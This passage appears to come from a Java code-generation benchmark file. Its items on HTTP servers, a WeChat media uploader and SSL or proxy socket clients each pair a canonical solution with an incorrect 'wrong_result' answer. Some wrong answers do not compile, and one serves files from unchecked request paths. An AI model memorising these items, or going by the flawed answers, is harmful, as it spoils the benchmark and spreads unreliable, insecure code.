out.write(endofline);\n        out.write(endofline);\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtMethod;\nimport javassist.NotFoundException;\nimport javassist.bytecode.Descriptor;\n\npublic class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    private Translator translator;\n    private byte[] endofline = \"\\r\\n\".getBytes();\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n    }\n\n    public void setClassPool(ClassPool loader) {\n        classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t) {\n        classPool = cp;\n        translator = t;\n    }\n\n    public void end() {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket clnt = socket.accept();\n                new Thread(() -> process(clnt)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n\n    private void process(Socket clnt) {\n        try (InputStream in = clnt.getInputStream(); OutputStream out = clnt.getOutputStream()) {\n            String requestLine = readLine(in);\n            if (requestLine == null || !requestLine.startsWith(\"GET\")) {\n                replyError(out, new BadHttpRequest(\"Invalid request\"));\n                return;\n            }\n            String[] parts = requestLine.split(\" \");\n            if (parts.length < 2) {\n                replyError(out, new BadHttpRequest(\"Invalid request\"));\n                return;\n            }\n            String path = parts[1];\n            if (path.equals(\"/\")) {\n                path = \"/index.html\";\n            }\n            if (path.endsWith(\".class\")) {\n                letUsersSendClassfile(out, path.substring(1), -1);\n            } else {\n                sendFile(out, path);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int b;\n        while ((b = in.read()) != -1) {\n            if (b == '\\r') {\n                if (in.read() == '\\n') {\n                    break;\n                }\n            } else {\n                sb.append((char) b);\n            }\n        }\n        return sb.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int b;\n        while ((b = in.read()) != -1) {\n            if (b == '\\r' && in.read() == '\\n') {\n                return 2;\n            }\n        }\n        return -1;\n    }\n\n    private void doReply(InputStream in, OutputStream out, String cmd) throws IOException {\n        if (cmd.equals(\"GET\")) {\n            String path = readLine(in);\n            if (path == null || !path.startsWith(\"/\")) {\n                replyError(out, new BadHttpRequest(\"Invalid request\"));\n                return;\n            }\n            if (path.endsWith(\".class\")) {\n                letUsersSendClassfile(out, path.substring(1), -1);\n            } else {\n                sendFile(out, path);\n            }\n        } else {\n            replyError(out, new BadHttpRequest(\"Unsupported method\"));\n        }\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out, String filename, int length) {\n        try {\n            CtClass cc = classPool.get(filename);\n            if (translator != null) {\n                translator.translate(cc);\n            }\n            byte[] bytecode = cc.toBytecode();\n            sendHeader(out, bytecode.length, 1);\n            out.write(bytecode);\n            out.flush();\n            return true;\n        } catch (NotFoundException | IOException | RuntimeException e) {\n            return false;\n        }\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype) throws IOException {\n        out.write(\"HTTP/1.0 200 OK\\r\\n\".getBytes());\n        out.write(\"Content-Type: \".getBytes());\n        if (filetype == 1) {\n            out.write(\"application/octet-stream\".getBytes());\n        } else {\n            out.write(\"text/html\".getBytes());\n        }\n        out.write(\"\\r\\n\".getBytes());\n        out.write(\"Content-Length: \".getBytes());\n        out.write(String.valueOf(dataLength).getBytes());\n        out.write(\"\\r\\n\".getBytes());\n        out.write(endofline);\n        out.flush();\n    }\n\n    private void sendFile(OutputStream out, String path) throws IOException {\n        File file = new File(path.substring(1));\n        if (!file.exists() || !file.canRead()) {\n            replyError(out, new BadHttpRequest(\"File not found\"));\n            return;\n        }\n        try (FileInputStream fis = new FileInputStream(file)) {\n            sendHeader(out, file.length(), 0);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            out.flush();\n        }\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e) throws IOException {\n        out.write(\"HTTP/1.0 400 Bad Request\\r\\n\".getBytes());\n        out.write(\"Content-Type: text/plain\\r\\n\".getBytes());\n        out.write(\"Content-Length: \".getBytes());\n        out.write(String.valueOf(e.getMessage().length()).getBytes());\n        out.write(\"\\r\\n\\r\\n\".getBytes());\n        out.write(e.getMessage().getBytes());\n        out.flush();\n    }\n\n    static class BadHttpRequest extends Exception {\n        BadHttpRequest(String message) {\n            super(message);\n        }\n    }\n\n    interface Translator {\n        void translate(CtClass cc) throws Exception;\n    }\n}\n```"
  },
  {
    "Task_id": 558,
    "Instruction": "Task Description: Implement a simple embedded HTTP server in Java that can handle incoming HTTP requests, parse request headers, and delegate request handling to a customizable method.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP requests, and provides hooks for custom request handling.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- serverSocket: ServerSocket - The server socket used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a new thread to handle connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response) -> void - Abstract method to be implemented for custom request handling (takes HTTP method, path, headers, request body stream, and response stream)\n- run() -> void - Main server loop that accepts connections, parses requests, and delegates to handle() method (implements Runnable interface)\n- BodyInputStream(InputStream ins, int n) -> None - Nested class constructor that creates an input stream with limited bytes to read\n- available() -> int - Returns the number of bytes available in the BodyInputStream\n- read() -> int - Reads a single byte from the BodyInputStream\n- read(byte[] b, int off, int len) -> int - Reads bytes into an array from the BodyInputStream\n- skip(long n) -> long - Throws IOException as skipping is not supported\n- close() -> void - Closes the underlying input stream",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\n\npublic class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    protected void handle(String method, String path,\n            HashMap<String, String> headers, InputStream input,\n            OutputStream response) throws Exception {\n    }\n\n    @Override\n    public void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<String, String>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0\n                                && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                handle(method, path, headers, input, os);\n                os.close();\n\n                conn.close();\n                conn = null;\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {\n                    }\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    private static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int n;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.n = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return n;\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (n <= 0)\n                return -1;\n            int r = ins.read();\n            if (r != -1)\n                n--;\n            return r;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (n <= 0)\n                return -1;\n            int l = ins.read(b, off, len < n ? len : n);\n            if (l != -1)\n                n -= l;\n            return l;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"unsupported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(this).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public abstract void handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response);\n\n    @Override\n    public void run() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(() -> {\n                    try {\n                        BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                        String requestLine = reader.readLine();\n                        if (requestLine == null) {\n                            return;\n                        }\n                        String[] requestParts = requestLine.split(\" \");\n                        String method = requestParts[0];\n                        String path = requestParts[1];\n\n                        HashMap<String, String> headers = new HashMap<>();\n                        String headerLine;\n                        while ((headerLine = reader.readLine()) != null && !headerLine.isEmpty()) {\n                            String[] headerParts = headerLine.split(\": \", 2);\n                            if (headerParts.length == 2) {\n                                headers.put(headerParts[0], headerParts[1]);\n                            }\n                        }\n\n                        InputStream inputStream = new BodyInputStream(clientSocket.getInputStream(), Integer.parseInt(headers.getOrDefault(\"Content-Length\", \"0\")));\n                        OutputStream outputStream = clientSocket.getOutputStream();\n\n                        handle(method, path, headers, inputStream, outputStream);\n\n                        clientSocket.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n\n    private class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int remaining;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.remaining = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return remaining;\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (remaining <= 0) {\n                return -1;\n            }\n            int b = ins.read();\n            if (b != -1) {\n                remaining--;\n            }\n            return b;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (remaining <= 0) {\n                return -1;\n            }\n            int bytesRead = ins.read(b, off, Math.min(len, remaining));\n            if (bytesRead != -1) {\n                remaining -= bytesRead;\n            }\n            return bytesRead;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"Skipping not supported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 56,
    "Instruction": "Task Description: Implement a utility class for handling media uploads to the WeChat API, including processing file types and managing HTTP connections for file transfer.\n\nClass Description: WechatMediaUtil is a Spring component that provides functionality to upload media files to WeChat's servers through their API. It handles authentication, file type validation, and multipart form data submission.\n\nAttributes:\n- wechatAccessTokenUtil: [WechatAccessTokenUtil] - Autowired dependency for managing WeChat access tokens\n- MEDIA_URL: [String] - Constant URL template for WeChat media upload API (contains ACCESS_TOKEN and TYPE placeholders)\n\nMethods:\n- uploadMedia: [uploadMedia](String type, String mediaFileUrl) -> String - Uploads a media file to WeChat servers. Takes media type and file URL as input, returns WeChat media ID. Handles token refresh on expiration and error cases.\n- judgeType: [judgeType](String contentType) -> String - Determines file extension from content type. Throws exception for unsupported types. Used internally by uploadMedia.\n\nInput for uploadMedia:\n- type: [String] - Media type (e.g., \"image\")\n- mediaFileUrl: [String] - URL of the media file to upload\n\nOutput for uploadMedia:\n- [String] - WeChat media ID of the uploaded file\n\nInput for judgeType:\n- contentType: [String] - MIME type of the file\n\nOutput for judgeType:\n- [String] - Corresponding file extension (e.g., \".jpg\")",
    "Canonical_solution": "import cn.hutool.json.JSONObject;\nimport cn.lili.common.enums.ClientTypeEnum;\nimport cn.lili.common.enums.ResultCode;\nimport cn.lili.common.exception.ServiceException;\nimport cn.lili.modules.wechat.util.WechatAccessTokenUtil;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\n@Component\npublic class WechatMediaUtil {\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        String accessToken = wechatAccessTokenUtil.cgiAccessToken(ClientTypeEnum.WECHAT_MP);\n        String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token=ACCESS_TOKEN&type=TYPE\";\n\n        StringBuffer resultStr = null;\n        String mediaStr = MEDIA_URL.replace(\"ACCESS_TOKEN\", accessToken).replace(\"TYPE\", type);\n        URL mediaUrl;\n        try {\n            String boundary = \"----WebKitFormBoundaryOYXo8heIv9pgpGjT\";\n            URL url = new URL(mediaStr);\n            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();\n            urlConn.setDoInput(true);\n            urlConn.setDoOutput(true);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n            urlConn.setRequestMethod(\"POST\");\n            OutputStream out = urlConn.getOutputStream();\n\n            mediaUrl = new URL(mediaFileUrl);\n            HttpURLConnection mediaConn = (HttpURLConnection) mediaUrl.openConnection();\n            mediaConn.setRequestMethod(\"GET\");\n            mediaConn.setDoInput(true);\n            String contentType = mediaConn.getHeaderField(\"Content-Type\");\n            String fileExt = judgeType(contentType);\n            InputStream in = mediaConn.getInputStream();\n            BufferedInputStream bufferedIn = new BufferedInputStream(in);\n            byte[] bytes = new byte[1024];\n            int size = 0;\n            out.write((\"--\" + boundary + \"\\r\\n\").getBytes());\n            out.write((\"Content-Disposition: form-data; name=\\\"media\\\";\\r\\n\"\n                    + \"filename=\\\"\" + (System.currentTimeMillis()) + fileExt + \"\\\"\\r\\n\"\n                    + \"Content-Type: \" + contentType + \"\\r\\n\\r\\n\").getBytes());\n            while ((size = bufferedIn.read(bytes)) != -1) {\n                out.write(bytes, 0, size);\n            }\n            out.write((\"\\r\\n--\" + boundary + \"--\\r\\n\").getBytes());\n\n            bufferedIn.close();\n            in.close();\n            mediaConn.disconnect();\n\n            InputStream resultIn = urlConn.getInputStream();\n            InputStreamReader reader = new InputStreamReader(resultIn);\n            BufferedReader bufferedReader = new BufferedReader(reader);\n            String tempStr = null;\n            resultStr = new StringBuffer();\n            while ((tempStr = bufferedReader.readLine()) != null) {\n                resultStr.append(tempStr);\n            }\n            bufferedReader.close();\n            reader.close();\n            resultIn.close();\n            urlConn.disconnect();\n        } catch (Exception e) {\n            log.error(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20\u5931\u8d25\", e);\n        }\n        assert resultStr != null;\n        JSONObject jsonObject = new JSONObject(resultStr.toString());\n        log.info(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20:\" + jsonObject);\n        if (jsonObject.get(\"errcode\") != null && (\"40001\").equals(jsonObject.get(\"errcode\"))) {\n            wechatAccessTokenUtil.removeAccessToken(ClientTypeEnum.WECHAT_MP);\n            return this.uploadMedia(type, mediaFileUrl);\n        } else if (jsonObject.get(\"errcode\") != null) {\n            throw new ServiceException(jsonObject.get(\"errmsg\").toString());\n        } else {\n            return jsonObject.get(\"media_id\").toString();\n        }\n    }\n\n    public String judgeType(String contentType) {\n        String fileExt = \"\";\n        switch (contentType) {\n            case \"image/png\":\n                fileExt = \".png\";\n                break;\n            case \"image/jpeg\":\n                fileExt = \".jpeg\";\n                break;\n            case \"image/jpg\":\n                fileExt = \".jpg\";\n                break;\n            default:\n                throw new ServiceException(ResultCode.IMAGE_FILE_EXT_ERROR);\n        }\n        return fileExt;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\npackage com.example.util;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.client.RestTemplate;\nimport org.springframework.core.io.UrlResource;\nimport org.springframework.http.HttpEntity;\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.http.MediaType;\nimport org.springframework.http.ResponseEntity;\n\nimport java.io.IOException;\nimport java.net.URL;\n\n@Component\npublic class WechatMediaUtil {\n\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    private static final String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token=ACCESS_TOKEN&type=TYPE\";\n\n    public String uploadMedia(String type, String mediaFileUrl) throws IOException {\n        String accessToken = wechatAccessTokenUtil.getAccessToken();\n        String url = MEDIA_URL.replace(\"ACCESS_TOKEN\", accessToken).replace(\"TYPE\", type);\n\n        RestTemplate restTemplate = new RestTemplate();\n        HttpHeaders headers = new HttpHeaders();\n        headers.setContentType(MediaType.MULTIPART_FORM_DATA);\n\n        UrlResource resource = new UrlResource(new URL(mediaFileUrl));\n        HttpEntity<UrlResource> requestEntity = new HttpEntity<>(resource, headers);\n\n        ResponseEntity<String> response = restTemplate.postForEntity(url, requestEntity, String.class);\n        return response.getBody();\n    }\n\n    public String judgeType(String contentType) {\n        if (contentType.startsWith(\"image/\")) {\n            if (contentType.equals(\"image/jpeg\")) return \".jpg\";\n            if (contentType.equals(\"image/png\")) return \".png\";\n            if (contentType.equals(\"image/gif\")) return \".gif\";\n            throw new IllegalArgumentException(\"Unsupported image type: \" + contentType);\n        } else if (contentType.startsWith(\"video/\")) {\n            if (contentType.equals(\"video/mp4\")) return \".mp4\";\n            throw new IllegalArgumentException(\"Unsupported video type: \" + contentType);\n        } else if (contentType.startsWith(\"audio/\")) {\n            if (contentType.equals(\"audio/mpeg\")) return \".mp3\";\n            throw new IllegalArgumentException(\"Unsupported audio type: \" + contentType);\n        } else {\n            throw new IllegalArgumentException(\"Unsupported file type: \" + contentType);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 560,
    "Instruction": "Task Description: Create a Java class that implements a secure socket client using SSL/TLS to communicate with a server. The client should be able to send HTTP requests and read responses.\n\nClass Description: The SocketClient class establishes a secure connection to a server using SSL/TLS, sends an HTTP GET request, and reads the response. It handles socket creation, SSL handshake, request sending, and response parsing.\n\nAttributes:\n- clientSslContext: [SSLContext] - The SSL context used for creating secure sockets\n- address: [InetSocketAddress] - The server address (host and port) to connect to\n\nMethods:\n- Constructor: [SocketClient]([SSLContext clientSslContext, InetSocketAddress address]) -> [void] - Initializes the client with SSL context and server address\n- doRequest: [doRequest]() -> [void] - Establishes connection, sends HTTP request, reads response, and closes connection (throws IOException)\n- readLine: [readLine]([InputStream is]) -> [String] - Helper method to read a line from input stream (throws IOException)\n- readResponse: [readResponse]([SSLSocket sslSocket]) -> [void] - Reads and processes the HTTP response headers and body (throws IOException)",
    "Canonical_solution": "import io.undertow.Undertow;\nimport io.undertow.util.Headers;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\n\npublic class SocketClient {\n\n    private SSLContext clientSslContext;\n    private InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        Socket rawSocket = new Socket();\n        rawSocket.connect(address);\n        SSLSocket sslSocket = (SSLSocket) clientSslContext.getSocketFactory()\n            .createSocket(rawSocket, \"localhost\", address.getPort(), false);\n        PrintWriter writer = new PrintWriter(sslSocket.getOutputStream());\n        writer.println(\"GET / HTTP/1.1\");\n        writer.println(\"Host: localhost\");\n        writer.println(\"Connection: keep-alive\");\n        writer.println();\n        writer.flush();\n        readResponse(sslSocket);\n\n        sslSocket.shutdownOutput();\n        rawSocket.close();\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder line = new StringBuilder();\n        while (true) {\n            int c = is.read();\n            switch (c) {\n                case -1:\n                    throw new RuntimeException(\"Unexpected EOF\");\n                case '\\r':\n                    continue;\n                case '\\n':\n                    return line.toString();\n                default:\n                    line.append((char) c);\n            }\n        }\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        String line;\n        int contentLength = 0;\n        Pattern CONTENT_LENGTH_PATTERN = Pattern.compile(\"Content-Length: ([0-9]+)\", Pattern.CASE_INSENSITIVE);\n\n        do {\n            line = readLine(sslSocket.getInputStream());\n            Matcher matcher = CONTENT_LENGTH_PATTERN.matcher(line);\n            if (matcher.matches()) {\n                contentLength = Integer.parseInt(matcher.group(1), 10);\n            }\n        } while (!line.isEmpty());\n\n        for (int i = 0; i < contentLength; i++) {\n            sslSocket.getInputStream().read();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\n\npublic class SocketClient {\n    private SSLContext clientSslContext;\n    private InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        SSLSocket sslSocket = (SSLSocket) clientSslContext.getSocketFactory().createSocket();\n        sslSocket.connect(address);\n\n        PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(sslSocket.getOutputStream())));\n        out.println(\"GET / HTTP/1.1\");\n        out.println(\"Host: \" + address.getHostString());\n        out.println(\"Connection: close\");\n        out.println();\n        out.flush();\n\n        readResponse(sslSocket);\n\n        sslSocket.close();\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = is.read()) != -1) {\n            if (c == '\\r') {\n                continue;\n            }\n            if (c == '\\n') {\n                break;\n            }\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        InputStream is = sslSocket.getInputStream();\n        String line;\n\n        while ((line = readLine(is)) != null && !line.isEmpty()) {\n            System.out.println(\"Header: \" + line);\n        }\n\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = is.read(buffer)) != -1) {\n            System.out.write(buffer, 0, bytesRead);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 561,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client capable of connecting to servers directly or through HTTP proxies, with support for SSL/TLS connections.\n\nClass Description: RouterSocketClient is a networking class that handles socket connections to remote servers, supporting both direct connections and HTTP proxy connections. It includes SSL/TLS capabilities and handles various connection scenarios with appropriate timeouts.\n\nAttributes:\n- TAG: [String] - Class tag for logging purposes\n- SERVER_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for server connections (20 seconds)\n- HTTP_PROXY_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for HTTP proxy connections (5 seconds)\n- TLS_HANDSHAKE_TIMEOUT_MILLIS: [int] - Timeout for TLS handshake (20 seconds)\n- mLock: [Object] - Synchronization lock object\n- mConnectivityManager: [ConnectivityManager] - Android network connectivity manager\n- mSSLSocketFactory: [SSLSocketFactory] - SSL socket factory for secure connections\n- mContext: [Context] - Android application context\n- mDelayedRestartHandler: [Handler] - Handler for delayed operations\n- mSocket: [Socket] - Current active socket connection\n- mThread: [Thread] - Thread handling socket operations\n\nMethods:\n- RouterSocketClient(Context, ConnectivityManager, Random) -> [Constructor] - Initializes the client with context, connectivity manager, and random number generator\n- connectSocket(String host, int port) -> [Socket] - Static method that establishes a socket connection to the specified host:port, handling both direct and proxy connections\n- connectSocketNoProxy(String host, int port) -> [Socket] - Static helper method for direct socket connections without proxy\n- connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) -> [Socket] - Static helper method for establishing connections through HTTP proxies using CONNECT method\n- tryEnableSni(SSLSocket socket, String hostname) -> [void] - Attempts to enable Server Name Indication (SNI) on the SSL socket\n- tryEnableSessionTickets(SSLSocket socket) -> [void] - Attempts to enable session tickets on the SSL socket",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.os.Handler;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.security.cert.X509Certificate;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.concurrent.CopyOnWriteArrayList;\n\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class RouterSocketClient {\n\n    private static final String TAG = RouterSocketClient.class.getSimpleName();\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(\n            Context context,\n            ConnectivityManager connectivityManager,\n            Random rng) {\n        mContext = context;\n        mDelayedRestartHandler = new Handler(mContext.getMainLooper());\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n    }\n\n    private static Socket connectSocket(String host, int port) throws IOException {\n        URI serverUri = URI.create(\"https://\" + host + \":\" + port);\n        ProxySelector proxySelector = ProxySelector.getDefault();\n        List<Proxy> proxies = proxySelector.select(serverUri);\n        if ((proxies == null) || (proxies.isEmpty())) {\n            proxies = Collections.singletonList(Proxy.NO_PROXY);\n        }\n\n        IOException lastFailure = null;\n        for (Proxy proxy : proxies) {\n            SocketAddress proxyAddress = proxy.address();\n            try {\n                if (Proxy.NO_PROXY.equals(proxy)) {\n                    return connectSocketNoProxy(host, port);\n                } else if (proxy.type() == Proxy.Type.HTTP) {\n                    return connectSocketViaHttpProxyConnectMethod(host, port, proxyAddress);\n                }\n            } catch (IOException e) {\n                lastFailure = e;\n                if (proxyAddress != null) {\n                    proxySelector.connectFailed(serverUri, proxyAddress, e);\n                }\n            }\n        }\n\n        if (lastFailure != null) {\n            throw lastFailure;\n        }\n        throw new IOException(\"No suitable connection methods found for \" + serverUri + \": \" + proxies);\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" directly\");\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            SocketAddress address = new InetSocketAddress(host, port);\n            socket = new Socket();\n            socket.connect(address, SERVER_CONNECT_TIMEOUT_MILLIS);\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(\n            String host, int port, SocketAddress proxyAddress) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" via HTTP proxy \" + proxyAddress);\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            InetSocketAddress proxyInetAddress = (InetSocketAddress) proxyAddress;\n            if (proxyInetAddress.isUnresolved()) {\n                proxyInetAddress = new InetSocketAddress(\n                        proxyInetAddress.getHostName(),\n                        proxyInetAddress.getPort());\n            }\n            socket = new Socket();\n            socket.connect(proxyInetAddress, HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(\n                    socket.getOutputStream(), \"US-ASCII\"));\n            out.write(\"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\");\n            out.write(\"Host: \" + host + \":\" + port + \"\\r\\n\");\n            out.write(\"\\r\\n\");\n            out.flush();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream(), \"US-ASCII\"));\n            String line;\n            boolean statusLineRead = false;\n            